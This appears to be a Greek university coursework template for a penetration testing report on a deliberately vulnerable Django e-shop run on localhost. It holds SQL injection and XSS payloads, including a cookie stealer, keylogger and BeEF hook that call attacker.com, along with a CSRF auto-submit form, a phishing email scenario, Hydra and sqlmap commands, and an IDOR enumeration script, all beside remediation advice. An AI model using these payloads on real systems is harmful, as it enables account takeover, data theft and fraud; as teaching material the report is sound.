# Τεχνική Αναφορά Δοκιμών Διείσδυσης - Εφαρμογή E-Shop

**Ταξινόμηση Εγγράφου**: Εμπιστευτικό  
**Έκδοση Αναφοράς**: 1.0  
**Ημερομηνία**: [ΗΜΕΡΟΜΗΝΙΑ]  
**Συντάκτης**: [ΟΝΟΜΑ ΦΟΙΤΗΤΗ]  
**Μάθημα**: CDS201 - Έλεγχος Εισβολών Δικτύων και Συστημάτων  
**Εξάμηνο**: Εαρινό 2025  

---

## Περίληψη

### Σύνοψη Ευρημάτων

Κατά τη διάρκεια των δοκιμών διείσδυσης στην εφαρμογή E-Shop, εντοπίστηκαν **πέντε (5) κρίσιμες ευπάθειες** που θέτουν σε σοβαρό κίνδυνο την ασφάλεια του συστήματος:

| Ευπάθεια | Σοβαρότητα | Επίπτωση |
|----------|------------|----------|
| SQL Injection | Κρίσιμη | Πλήρης πρόσβαση στη βάση δεδομένων |
| Cross-Site Scripting (XSS) | Υψηλή | Κλοπή συνεδριών και phishing |
| Αδυναμίες Ταυτοποίησης | Κρίσιμη | Παραβίαση λογαριασμών |
| IDOR | Υψηλή | Πρόσβαση σε δεδομένα άλλων χρηστών |
| CSRF | Υψηλή | Μη εξουσιοδοτημένες ενέργειες |

### Κύριες Συστάσεις

1. **Άμεση αντιμετώπιση** όλων των κρίσιμων ευπαθειών
2. **Εφαρμογή ασφαλών πρακτικών** προγραμματισμού
3. **Τακτικοί έλεγχοι ασφαλείας** και code reviews
4. **Εκπαίδευση προσωπικού** σε θέματα ασφάλειας

---

## 1. Εισαγωγή

### 1.1 Σκοπός

Η παρούσα αναφορά τεκμηριώνει τα αποτελέσματα των δοκιμών διείσδυσης που πραγματοποιήθηκαν στην εφαρμογή ηλεκτρονικού καταστήματος (E-Shop) στο πλαίσιο του μαθήματος CDS201. Σκοπός των δοκιμών ήταν:

- Ο εντοπισμός ευπαθειών ασφαλείας στην εφαρμογή
- Η αξιολόγηση της δυνατότητας εκμετάλλευσης των ευπαθειών
- Η εκτίμηση των επιπτώσεων στην επιχείρηση
- Η παροχή συστάσεων αντιμετώπισης

### 1.2 Εύρος Ελέγχου (Scope)

Οι δοκιμές διείσδυσης κάλυψαν:

- **URL Εφαρμογής**: http://localhost:8000
- **Τύπος Εφαρμογής**: Django Web Application (E-Commerce)
- **Περιβάλλον**: Ελεγχόμενο τοπικό περιβάλλον ανάπτυξης
- **Χρονική Περίοδος**: [ΗΜΕΡΟΜΗΝΙΑ ΕΝΑΡΞΗΣ] έως [ΗΜΕΡΟΜΗΝΙΑ ΛΗΞΗΣ]

### 1.3 Περιορισμοί

Οι δοκιμές πραγματοποιήθηκαν με τους εξής περιορισμούς:

- Χωρίς δοκιμές DoS/DDoS
- Μόνο στο τοπικό περιβάλλον (localhost)
- Χωρίς social engineering
- Χωρίς φυσική πρόσβαση

---

## 2. Μεθοδολογία

### 2.1 Πρότυπα και Οδηγοί

Οι δοκιμές ακολούθησαν τη μεθοδολογία:

- **OWASP Web Security Testing Guide v4.2**
- **OWASP Top 10 2021**
- **PTES (Penetration Testing Execution Standard)**

### 2.2 Φάσεις Ελέγχου

#### Φάση 1: Αναγνώριση (Reconnaissance)
- Χαρτογράφηση της εφαρμογής
- Εντοπισμός endpoints και λειτουργιών
- Ανάλυση τεχνολογιών

#### Φάση 2: Σάρωση (Scanning)
- Αυτοματοποιημένη σάρωση ευπαθειών
- Ανάλυση HTTP requests/responses
- Εντοπισμός σημείων εισόδου

#### Φάση 3: Απαρίθμηση (Enumeration)
- Απαρίθμηση χρηστών
- Ανακάλυψη κρυφών endpoints
- Συλλογή πληροφοριών

#### Φάση 4: Εκμετάλλευση (Exploitation)
- Δοκιμή εντοπισμένων ευπαθειών
- Ανάπτυξη proof-of-concept
- Τεκμηρίωση επιτυχών επιθέσεων

#### Φάση 5: Ανάλυση Επιπτώσεων
- Αξιολόγηση επιχειρηματικού αντίκτυπου
- Ανάλυση ρίσκου
- Προτεραιοποίηση ευρημάτων

### 2.3 Εργαλεία που Χρησιμοποιήθηκαν

| Κατηγορία | Εργαλείο | Χρήση |
|-----------|----------|-------|
| Proxy | Burp Suite Community | Ανάλυση και τροποποίηση HTTP traffic |
| SQL Injection | SQLMap v1.7 | Αυτοματοποιημένη εκμετάλλευση SQLi |
| XSS | XSStrike | Εντοπισμός και δοκιμή XSS |
| Brute Force | Hydra | Επιθέσεις brute force |
| Scanning | OWASP ZAP | Αυτοματοποιημένη σάρωση |
| Custom Scripts | Python | Εξειδικευμένα exploitation scripts |

---

## 3. Χαρτογράφηση Εφαρμογής

### 3.1 Αρχιτεκτονική

**[ΟΔΗΓΙΕΣ SCREENSHOT 1]**
```
Τίτλος: Αρχιτεκτονική Εφαρμογής E-Shop
Περιεχόμενο: Διάγραμμα που δείχνει:
- Frontend (HTML/CSS/JavaScript)
- Backend (Django Framework)
- Database (SQLite)
- Session Management

Εργαλείο: draw.io ή Lucidchart
Οδηγίες:
1. Δημιουργήστε διάγραμμα με 3 επίπεδα
2. Προσθέστε βέλη για data flow
3. Σημειώστε τα σημεία ευπαθειών
```

### 3.2 Εντοπισμένα Endpoints

| Endpoint | Μέθοδος | Λειτουργία | Ευπάθεια |
|----------|---------|------------|----------|
| `/` | GET | Αρχική σελίδα | - |
| `/catalog/` | GET | Κατάλογος/Αναζήτηση | SQL Injection, XSS |
| `/login/` | GET, POST | Σύνδεση χρήστη | User Enumeration |
| `/product/<id>/` | GET | Λεπτομέρειες προϊόντος | XSS |
| `/order/<id>/` | GET | Προβολή παραγγελίας | IDOR |
| `/transfer-credits/` | POST | Μεταφορά πιστώσεων | CSRF |
| `/update-email/` | POST | Ενημέρωση email | CSRF |

### 3.3 Τεχνολογίες

- **Framework**: Django 4.x
- **Database**: SQLite
- **Frontend**: Bootstrap, jQuery
- **Session Management**: Django Sessions
- **Password Hashing**: MD5 (ευπάθεια)

---

## 4. Αναλυτικά Ευρήματα

### 4.1 SQL Injection - Κρίσιμη Ευπάθεια

#### 4.1.1 Περιγραφή

Η λειτουργία αναζήτησης προϊόντων είναι ευάλωτη σε SQL injection λόγω της απευθείας ενσωμάτωσης των δεδομένων εισόδου του χρήστη στο SQL query χωρίς sanitization.

#### 4.1.2 Τεχνικές Λεπτομέρειες

**Ευάλωτος Κώδικας** (`eshop/views.py`, γραμμές 366-371):
```python
raw_query = f"""
SELECT * FROM eshop_product 
WHERE name LIKE '%%{search_query}%%'
"""
cursor.execute(raw_query)
```

#### 4.1.3 Απόδειξη Εκμετάλλευσης

**[ΟΔΗΓΙΕΣ SCREENSHOT 2]**
```
Τίτλος: SQL Injection - Εξαγωγή Χρηστών
Βήματα:
1. Ανοίξτε τον browser στο http://localhost:8000/catalog/
2. Στο πεδίο αναζήτησης εισάγετε: ' UNION SELECT NULL,username,password,NULL,NULL,NULL,NULL FROM auth_user--
3. Πατήστε Enter
4. Screenshot που δείχνει τα usernames και password hashes στα αποτελέσματα

Εναλλακτικά με Burp Suite:
1. Intercept request στο /catalog/?q=
2. Αλλάξτε το parameter q σε: '+UNION+SELECT+NULL,username,password,NULL,NULL,NULL,NULL+FROM+auth_user--
3. Forward το request
4. Screenshot του response με τα credentials
```

**Payload Επίθεσης**:
```sql
' UNION SELECT NULL,username,password,NULL,NULL,NULL,NULL FROM auth_user--
```

**Αποτέλεσμα**: Επιτυχής εξαγωγή όλων των usernames και password hashes από τη βάση δεδομένων.

#### 4.1.4 Επιπτώσεις

- **Εμπιστευτικότητα**: Πλήρης πρόσβαση σε όλα τα δεδομένα της βάσης
- **Ακεραιότητα**: Δυνατότητα τροποποίησης δεδομένων
- **Διαθεσιμότητα**: Δυνατότητα διαγραφής πινάκων

**[ΟΔΗΓΙΕΣ SCREENSHOT 3]**
```
Τίτλος: SQLMap Automated Exploitation
Εντολή: sqlmap -u "http://localhost:8000/catalog/?q=test" --dump --batch
Βήματα:
1. Ανοίξτε terminal
2. Εκτελέστε την παραπάνω εντολή
3. Screenshot που δείχνει:
   - Identified injection points
   - Dumped database tables
   - Extracted data
```

#### 4.1.5 Βαθμολογία CVSS

**CVSS v3.1 Score: 9.8 (Critical)**
- Attack Vector: Network (AV:N)
- Attack Complexity: Low (AC:L)
- Privileges Required: None (PR:N)
- User Interaction: None (UI:N)
- Scope: Unchanged (S:U)
- Confidentiality: High (C:H)
- Integrity: High (I:H)
- Availability: High (A:H)

---

### 4.2 Cross-Site Scripting (XSS) - Υψηλή Ευπάθεια

#### 4.2.1 Περιγραφή

Πολλαπλές περιπτώσεις XSS εντοπίστηκαν:
- **Reflected XSS**: Στα αποτελέσματα αναζήτησης
- **Stored XSS**: Στο σύστημα κριτικών προϊόντων

#### 4.2.2 Reflected XSS

**Ευάλωτο Template** (`catalog.html`, γραμμή 26):
```django
<strong>{{ search_query|safe }}</strong>
```

**[ΟΔΗΓΙΕΣ SCREENSHOT 4]**
```
Τίτλος: Reflected XSS Demonstration
Βήματα:
1. Πλοηγηθείτε στο http://localhost:8000/catalog/
2. Στην αναζήτηση εισάγετε: <script>alert('XSS')</script>
3. Screenshot του alert box
4. Εναλλακτικά, χρησιμοποιήστε payload: <img src=x onerror=alert('XSS')>
```

#### 4.2.3 Stored XSS

**[ΟΔΗΓΙΕΣ SCREENSHOT 5]**
```
Τίτλος: Stored XSS σε Product Reviews
Βήματα:
1. Login ως χρήστης
2. Πηγαίνετε σε ένα προϊόν
3. Υποβάλετε review με:
   Title: Great Product
   Content: <script>document.location='http://attacker.com/steal?c='+document.cookie</script>
4. Screenshot της review που εμφανίζεται χωρίς escaping
5. Developer tools που δείχνει το script να εκτελείται
```

#### 4.2.4 Επιπτώσεις

- Κλοπή session cookies
- Phishing attacks
- Defacement
- Keylogging

**[ΟΔΗΓΙΕΣ PROOF OF CONCEPT]**
```
Δημιουργήστε αρχείο xss_poc.html:

<!DOCTYPE html>
<html>
<head><title>XSS PoC</title></head>
<body>
<h1>XSS Cookie Stealer</h1>
<script>
// Αυτόματη κλοπή cookies
var stolen = document.cookie;
document.write('<img src="http://attacker.com/steal?cookies=' + stolen + '">');
</script>
</body>
</html>

Screenshot: Ανοίξτε το αρχείο και δείξτε το network request
```

---

### 4.3 Αδυναμίες Ταυτοποίησης - Κρίσιμη Ευπάθεια

#### 4.3.1 User Enumeration

**Ευάλωτος Κώδικας** (`forms.py`, γραμμές 154-172):
```python
try:
    user = User.objects.get(username=username)
    if not user.check_password(password):
        raise ValidationError("Invalid password for user '{}'".format(username))
except User.DoesNotExist:
    raise ValidationError("Username '{}' does not exist".format(username))
```

**[ΟΔΗΓΙΕΣ SCREENSHOT 6]**
```
Τίτλος: User Enumeration via Error Messages
Βήματα:
1. Burp Suite intercept ON
2. Login attempt με username: admin, password: wrong
3. Screenshot του response: "Invalid password for user 'admin'"
4. Login attempt με username: doesnotexist, password: wrong  
5. Screenshot του response: "Username 'doesnotexist' does not exist"
6. Δείξτε τη διαφορά στα μηνύματα
```

#### 4.3.2 Brute Force - Απουσία Rate Limiting

**[ΟΔΗΓΙΕΣ SCREENSHOT 7]**
```
Τίτλος: Brute Force Attack με Hydra
Εντολή: 
hydra -l admin -P /usr/share/wordlists/rockyou.txt localhost http-post-form "/login/:username=^USER^&password=^PASS^:Invalid"

Screenshot που δείχνει:
- Hydra running
- Multiple login attempts per second
- Found password (αν υπάρχει στο wordlist)
```

#### 4.3.3 Weak Password Hashing (MD5)

**[ΟΔΗΓΙΕΣ SCREENSHOT 8]**
```
Τίτλος: MD5 Hash Cracking
Βήματα:
1. Από το SQL injection, πάρτε ένα MD5 hash
2. Χρησιμοποιήστε: https://crackstation.net/
3. Ή εκτελέστε: hashcat -m 0 hash.txt wordlist.txt
4. Screenshot του cracked password
```

---

### 4.4 Insecure Direct Object Reference (IDOR) - Υψηλή Ευπάθεια

#### 4.4.1 Περιγραφή

Η εφαρμογή επιτρέπει την πρόσβαση σε παραγγελίες άλλων χρηστών χωρίς έλεγχο εξουσιοδότησης.

#### 4.4.2 Εκμετάλλευση

**[ΟΔΗΓΙΕΣ SCREENSHOT 9]**
```
Τίτλος: IDOR - Πρόσβαση σε Ξένες Παραγγελίες
Βήματα:
1. Login ως χρήστης testuser1
2. Πηγαίνετε στο /my-orders/
3. Σημειώστε ένα order ID (π.χ. ORD-ABC12-XYZ34)
4. Αλλάξτε το URL σε /order/ORD-ABC13-XYZ34/ (διαφορετικό ID)
5. Screenshot που δείχνει:
   - Πρόσβαση σε παραγγελία άλλου χρήστη
   - Προσωπικά δεδομένα (όνομα, διεύθυνση, τηλέφωνο)
```

**Python Script για Αυτοματοποίηση**:
```python
import requests

session = requests.Session()
# Login first
session.post('http://localhost:8000/login/', 
             data={'username': 'testuser', 'password': 'password'})

# Try different order IDs
for i in range(100):
    order_id = f"ORD-TEST{i:02d}-DEMO{i:02d}"
    response = session.get(f'http://localhost:8000/order/{order_id}/')
    if response.status_code == 200:
        print(f"[+] Found accessible order: {order_id}")
```

#### 4.4.3 Δεδομένα που Εκτέθηκαν

- Προσωπικά στοιχεία πελατών
- Διευθύνσεις αποστολής
- Τηλέφωνα επικοινωνίας
- Ιστορικό παραγγελιών
- Συνολικά ποσά αγορών

---

### 4.5 Cross-Site Request Forgery (CSRF) - Υψηλή Ευπάθεια

#### 4.5.1 Περιγραφή

Τα endpoints για μεταφορά πιστώσεων και αλλαγή email δεν έχουν προστασία CSRF.

#### 4.5.2 Ευάλωτα Endpoints

- `/transfer-credits/` - Μεταφορά χρημάτων
- `/update-email/` - Αλλαγή email

**[ΟΔΗΓΙΕΣ SCREENSHOT 10]**
```
Τίτλος: CSRF Attack Demonstration
Βήματα:
1. Login στην εφαρμογή ως θύμα
2. Δημιουργήστε αρχείο csrf_attack.html:

<html>
<body onload="document.forms[0].submit()">
<form action="http://localhost:8000/transfer-credits/" method="POST">
    <input type="hidden" name="recipient" value="attacker">
    <input type="hidden" name="amount" value="999.99">
</form>
</body>
</html>

3. Ανοίξτε το αρχείο ενώ είστε logged in
4. Screenshot του success message για τη μεταφορά
5. Screenshot του /profile/ που δείχνει τη μεταφορά
```

#### 4.5.3 Επίθεση μέσω Email

**[ΟΔΗΓΙΕΣ PROOF OF CONCEPT]**
```
Σενάριο: Phishing email με CSRF
1. Δημιουργήστε email template:
   Subject: Κερδίσατε 1000€!
   Body: Κάντε κλικ εδώ: http://attacker.com/prize.html
   
2. Το prize.html περιέχει hidden CSRF forms
3. Screenshot του email
4. Screenshot της σελίδας που φορτώνει
```

---

## 5. Ανάλυση Επιχειρηματικού Αντίκτυπου

### 5.1 Οικονομικές Επιπτώσεις

| Ευπάθεια | Άμεσο Κόστος | Έμμεσο Κόστος |
|----------|--------------|----------------|
| SQL Injection | €50,000-100,000 (GDPR πρόστιμα) | Απώλεια εμπιστοσύνης |
| XSS | €10,000-30,000 (incident response) | Απώλεια πελατών |
| IDOR | €20,000-50,000 (data breach) | Νομικές ενέργειες |
| CSRF | €5,000-20,000 (fraud losses) | Αποζημιώσεις |

### 5.2 Επιπτώσεις Συμμόρφωσης

- **GDPR**: Παραβίαση άρθρων 25, 32 (Privacy by Design, Security)
- **PCI-DSS**: Μη συμμόρφωση αν επεξεργάζεται κάρτες
- **ePrivacy**: Παραβίαση cookie security

### 5.3 Φήμη και Εμπιστοσύνη

**[ΟΔΗΓΙΕΣ ΔΙΑΓΡΑΜΜΑ]**
```
Δημιουργήστε διάγραμμα που δείχνει:
- Πριν το incident: 85% customer trust
- Μετά το breach: 35% customer trust
- Recovery time: 18-24 μήνες
Εργαλείο: Excel ή Google Sheets
```

---

## 6. Μήτρα Κινδύνου (Risk Matrix)

### 6.1 Μεθοδολογία Αξιολόγησης

Ο κίνδυνος υπολογίζεται ως: **Risk = Likelihood × Impact**

### 6.2 Πίνακας Κινδύνων

| Ευπάθεια | Πιθανότητα | Επίπτωση | Κίνδυνος | Προτεραιότητα |
|----------|------------|----------|----------|---------------|
| SQL Injection | Πολύ Υψηλή (5) | Καταστροφική (5) | 25 - Κρίσιμος | 1 |
| Authentication | Πολύ Υψηλή (5) | Πολύ Υψηλή (4) | 20 - Κρίσιμος | 2 |
| XSS | Υψηλή (4) | Υψηλή (4) | 16 - Υψηλός | 3 |
| IDOR | Υψηλή (4) | Υψηλή (4) | 16 - Υψηλός | 4 |
| CSRF | Μέτρια (3) | Υψηλή (4) | 12 - Υψηλός | 5 |

**[ΟΔΗΓΙΕΣ HEAT MAP]**
```
Δημιουργήστε Risk Heat Map 5x5:
- X axis: Likelihood (1-5)
- Y axis: Impact (1-5)
- Τοποθετήστε κάθε ευπάθεια στο σωστό τετράγωνο
- Χρώματα: Κόκκινο (Critical), Πορτοκαλί (High), Κίτρινο (Medium)
Εργαλείο: PowerPoint ή draw.io
```

---

## 7. Συστάσεις Αντιμετώπισης

### 7.1 Άμεσες Ενέργειες (0-7 ημέρες)

#### SQL Injection
```python
# Αντί για:
query = f"SELECT * FROM products WHERE name LIKE '%{search}%'"

# Χρήση:
products = Product.objects.filter(name__icontains=search)
```

#### XSS
```django
<!-- Αντί για: -->
{{ user_input|safe }}

<!-- Χρήση: -->
{{ user_input }}  <!-- Auto-escaped by Django -->
```

#### Authentication
```python
# settings.py
PASSWORD_HASHERS = [
    'django.contrib.auth.hashers.Argon2PasswordHasher',
]

# Προσθήκη rate limiting
MIDDLEWARE = [
    'django_ratelimit.middleware.RatelimitMiddleware',
]
```

### 7.2 Μεσοπρόθεσμες Ενέργειες (1-4 εβδομάδες)

1. **Εφαρμογή WAF (Web Application Firewall)**
2. **Security Headers**:
   ```python
   SECURE_BROWSER_XSS_FILTER = True
   SECURE_CONTENT_TYPE_NOSNIFF = True
   X_FRAME_OPTIONS = 'DENY'
   ```

3. **Έλεγχοι Πρόσβασης**:
   ```python
   def view_order(request, order_id):
       order = get_object_or_404(Order, id=order_id, user=request.user)
   ```

### 7.3 Μακροπρόθεσμες Ενέργειες (1-3 μήνες)

1. **Security Development Lifecycle (SDL)**
2. **Τακτικά Security Audits**
3. **Εκπαίδευση Developers**
4. **Bug Bounty Program**

---

## 8. Συμπεράσματα

### 8.1 Γενική Αξιολόγηση

Η εφαρμογή E-Shop παρουσιάζει **κρίσιμες ευπάθειες** που την καθιστούν **ακατάλληλη για παραγωγική χρήση**. Απαιτείται άμεση και ολοκληρωμένη αντιμετώπιση όλων των ευρημάτων.

### 8.2 Θετικά Σημεία

- Χρήση Django framework (παρέχει built-in security features)
- HTTPS capability
- Structured codebase

### 8.3 Επόμενα Βήματα

1. **Remediation Sprint**: 2 εβδομάδες για critical fixes
2. **Re-testing**: Επαναέλεγχος μετά τις διορθώσεις
3. **Security Training**: Υποχρεωτική εκπαίδευση για developers
4. **Continuous Monitoring**: Εγκατάσταση security monitoring

---

## Παραρτήματα

### Παράρτημα Α: Τεχνικές Λεπτομέρειες Exploits

#### A.1 SQL Injection Payloads

```sql
-- Εξαγωγή version
' UNION SELECT NULL,@@version,NULL,NULL,NULL,NULL,NULL--

-- Εξαγωγή tables
' UNION SELECT NULL,table_name,NULL,NULL,NULL,NULL,NULL 
FROM information_schema.tables--

-- Εξαγωγή columns
' UNION SELECT NULL,column_name,NULL,NULL,NULL,NULL,NULL 
FROM information_schema.columns WHERE table_name='auth_user'--
```

#### A.2 XSS Payloads

```javascript
// Basic alert
<script>alert('XSS')</script>

// Cookie stealer
<script>document.location='http://attacker.com/steal?c='+document.cookie</script>

// Keylogger
<script>
document.onkeypress = function(e) {
    fetch('http://attacker.com/log?key=' + e.key);
}
</script>

// BeEF hook
<script src="http://attacker.com:3000/hook.js"></script>
```

### Παράρτημα Β: Εργαλεία και Scripts

#### B.1 Automated Testing Script

```python
#!/usr/bin/env python3
import requests
import sys

def test_sqli(url):
    payloads = [
        "' OR '1'='1",
        "' UNION SELECT NULL--",
        "'; DROP TABLE users--"
    ]
    
    for payload in payloads:
        r = requests.get(f"{url}/catalog/?q={payload}")
        if "error" in r.text.lower() or len(r.text) > 5000:
            print(f"[+] Possible SQLi with: {payload}")

def test_xss(url):
    payloads = [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "javascript:alert(1)"
    ]
    
    for payload in payloads:
        r = requests.get(f"{url}/catalog/?q={payload}")
        if payload in r.text:
            print(f"[+] Reflected XSS with: {payload}")

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8000"
    test_sqli(target)
    test_xss(target)
```

### Παράρτημα Γ: Αναφορές

1. OWASP Top 10 2021: https://owasp.org/Top10/
2. OWASP Testing Guide: https://owasp.org/www-project-web-security-testing-guide/
3. CWE Database: https://cwe.mitre.org/
4. CVSS Calculator: https://www.first.org/cvss/calculator/3.1
5. Django Security: https://docs.djangoproject.com/en/4.0/topics/security/

---

**Τέλος Αναφοράς**

**Συντάχθηκε από**: [ΟΝΟΜΑ]  
**Ημερομηνία**: [ΗΜΕΡΟΜΗΝΙΑ]  
**Υπογραφή**: _________________

**Ελέγχθηκε από**: [ΚΑΘΗΓΗΤΗΣ]  
**Ημερομηνία**: [ΗΜΕΡΟΜΗΝΙΑ]  
**Υπογραφή**: _________________